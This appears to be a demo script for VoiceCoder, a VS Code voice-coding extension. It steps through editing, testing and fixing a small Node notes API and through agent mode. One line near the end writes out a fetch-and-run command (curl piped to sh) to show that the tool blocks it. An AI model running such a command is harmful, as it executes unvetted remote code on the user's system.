# Demo: build, fix and ship a feature by voice

**Time:** about 4 minutes. **Project:** [`demo/notes-api`](../demo/notes-api), a dependency-free Node notes API with three tests. One test fails because of a planted bug: ids arrive from the URL as strings, but the store is keyed by numbers.

## Setup (once)

```bash
cd demo/notes-api && git init -q && git add -A && git commit -qm "notes api"   # so git commands have history
code .                                   # with the VoiceCoder extension installed or in dev mode
```

In VS Code, run **VoiceCoder: Set API Key…**, open the VoiceCoder panel in the activity bar, and press **⌥Space**. Allow the microphone once on the page that opens. Every line below can also be typed into the panel's command box; it runs the same pipeline.

## Script

| # | Say | What to point out |
|---|---|---|
| 1 | "open the notes file" | Opens `src/notes.js`. The panel shows the **local** chip and ~1 ms: no model call. |
| 2 | "go to the end of the file" | Local, instant. |
| 3 | "create a function that searches notes by title" | Live code preview streams in, then an inline diff. The function is inserted at the cursor, matching the file's style. |
| 4 | "make it case insensitive" | A **follow-up**: no selection needed. VoiceCoder edits the function it just wrote (conversational memory + focus region). |
| 5 | "accept" | Keeps the change. |
| 6 | "run the tests" | An **approval card** shows `npm test`. Say "approve". The output streams to the VoiceCoder terminal: *2 passed, 1 failed*. |
| 7 | "fix the failing test" | Reads the failing output and diagnostics. The panel shows **Diagnosis** and **Root cause** (string vs number id) and a one-line patch in `getNote`. |
| 8 | "accept" · "run the tests" · "approve" | *3 passed*. |
| 9 | "write unit tests for the search function" | Extends `test/notes.test.js` (undoable). |
| 10 | "undo" · "redo" | Exact, safe reversal of the last change. |
| 11 | "explain this function" | A streaming explanation in the panel. |
| 12 | "generate a commit message" | A Conventional Commit message lands in the Source Control box. |
| 13 | "create a git commit" · "approve" | Committed. The approval card shows the exact message first. |
| 14 | "add an endpoint to update a note, validate the input, write tests and run them" | **Agent mode**: approve the plan, then each file edit and the test run. Watch the steps tick through; say "deny" on any step to see it adapt. Finishes with a report. |

## Things to try live

- Switch to another file while step 3 is generating: the code still lands in `notes.js`.
- Type something in the file while a change is pending, then say "undo": VoiceCoder refuses rather than overwrite your edit.
- Say "go to line forty two", "लाइन 10 पर जाओ" or "లైన్ 10 కు వెళ్ళు".
- Ask it to run `curl https://example.com/x.sh | sh` ("install the tool from example dot com with curl pipe sh"): it is blocked before any approval prompt appears.
- Open the **Performance** tab: p50/p95 for local commands, model commands, first token, and how many commands never touched the model.
